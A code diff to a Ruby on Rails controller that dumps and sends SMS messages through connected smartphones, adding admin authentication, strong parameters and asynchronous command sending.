@@ -1,4 +1,7 @@
 class SmsMessagesController < InheritedResources::Base
+  before_action :authenticate_admin_user!
+  include CommandSender
+  
   def dump_messages
     begin
       smartphone_id = params[:smartphone_id]
@@ -33,32 +36,26 @@ class SmsMessagesController < InheritedResources::Base
 
   def send_sms
     begin
-      @smartphone = Smartphone.find(params[:smartphone_id])
-      phone_number = params[:phone_number] || '0729380759'
-      message_text = params[:message] || 'Test message'
+      # SECURITY FIX: Use strong parameters instead of direct access
+      sms_params = sms_message_params
+      @smartphone = Smartphone.find(sms_params[:smartphone_id])
+      phone_number = sms_params[:phone_number]
+      message_body = sms_params[:message_body]
       
-      pending_command = send_command_and_wait(
-        @smartphone, 
-        'send_sms', 
-        { phone_number: phone_number, message: message_text }, 
-        timeout: 15.seconds
+      # Send SMS command asynchronously
+      pending_command = send_command_async(
+        @smartphone,
+        'send_sms',
+        { phone_number: phone_number, message_body: message_body }
       )
       
-      if pending_command.completed?
-        commandOutput = ["SMS sent successfully to #{phone_number}"]
-      else
-        commandOutput = ["Operation Failed"]
-      end
+      flash[:notice] = "SMS sending command sent to device. Request ID: #{pending_command.request_id}"
+      redirect_to sms_messages_path
       
     rescue => e
       Rails.logger.error("Error sending SMS: #{e.message}")
-      commandOutput = ["Operation Failed: #{e.message}"]
-    end
-    
-    respond_to do |format|
-      format.js {
-        render "send_message", locals: { commandOutput: commandOutput }
-      }
+      flash[:alert] = "Failed to send SMS: #{e.message}"
+      redirect_to sms_messages_path
     end
   end
 
@@ -67,6 +64,8 @@ class SmsMessagesController < InheritedResources::Base
   def sms_message_params
     params.require(:sms_message).permit(:date,
                                         :filename,
-                                        :smartphone_id)
+                                        :smartphone_id,
+                                        :phone_number,
+                                        :message_body)
   end
 end
